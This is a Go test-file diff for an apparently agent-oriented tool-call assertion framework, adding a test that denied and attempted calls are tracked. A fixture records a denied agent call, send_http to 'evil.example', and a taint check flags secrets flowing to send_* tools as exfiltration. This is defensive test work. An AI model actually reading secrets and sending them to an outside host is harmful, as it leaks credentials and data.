@@ -46,11 +46,11 @@ func TestAssertionsPass(t *testing.T) {
 
 func TestAssertionsFail(t *testing.T) {
 	sc := &Scenario{Version: 1, Assert: []Check{
-		{NeverCalled: "send_*"},                    // send_http WAS called
+		{NeverCalled: "send_*"}, // send_http WAS called
 		{TaintNever: &TaintSpec{From: "read_secrets", To: "send_*"}}, // exfil!
 		{Called: &CalledSpec{Tool: "deploy", Times: intPtr(2)}},      // only 1
 		{Sequence: []string{"deploy", "build_artifact"}},             // wrong order
-		{Denied: "deploy"},                                          // was allowed
+		{Denied: "deploy"}, // was allowed
 		{Invariant: "bogus_invariant"},
 	}}
 	fails := Run(sc, demoTape(), nil)
@@ -111,3 +111,42 @@ func TestParseValidation(t *testing.T) {
 }
 
 func intPtr(n int) *int { return &n }
+
+// TestDeniedAndAttemptedSeeUnanswered pins the trajectory-assertion
+// contract: verdict assertions must see DENIED calls (which live in
+// Unanswered), and `attempted:` matches anything that reached the
+// boundary regardless of the verdict.
+func TestDeniedAndAttemptedSeeUnanswered(t *testing.T) {
+	tape := &replay.Tape{
+		Interactions: []replay.Interaction{
+			it(1, "read_file", `{"path":"/x"}`, `{"text":"ok"}`, "allow"),
+		},
+		Unanswered: []replay.Interaction{
+			it(2, "send_http", `{"url":"https://evil.example"}`, "", "deny"),
+		},
+	}
+	sc := &Scenario{Version: 1, Assert: []Check{
+		{Denied: "send_http"},
+		{Attempted: &AttemptSpec{Tool: "send_*", Times: intPtr(1)}},
+		{Attempted: &AttemptSpec{Tool: "read_file", Times: intPtr(1)}},
+		{Called: &CalledSpec{Tool: "read_file", Times: intPtr(1)}},
+	}}
+	if fails := Run(sc, tape, nil); len(fails) != 0 {
+		t.Fatalf("denied/attempted must see unanswered calls: %+v", fails)
+	}
+
+	// called: stays on answered calls only - send_http never executed.
+	sc2 := &Scenario{Version: 1, Assert: []Check{
+		{Called: &CalledSpec{Tool: "send_http"}},
+	}}
+	if fails := Run(sc2, tape, nil); len(fails) != 1 {
+		t.Fatalf("called: must not match denied calls, got %+v", fails)
+	}
+	// ...and attempted: with no match fails.
+	sc3 := &Scenario{Version: 1, Assert: []Check{
+		{Attempted: &AttemptSpec{Tool: "delete_*"}},
+	}}
+	if fails := Run(sc3, tape, nil); len(fails) != 1 {
+		t.Fatalf("attempted: with no match must fail, got %+v", fails)
+	}
+}
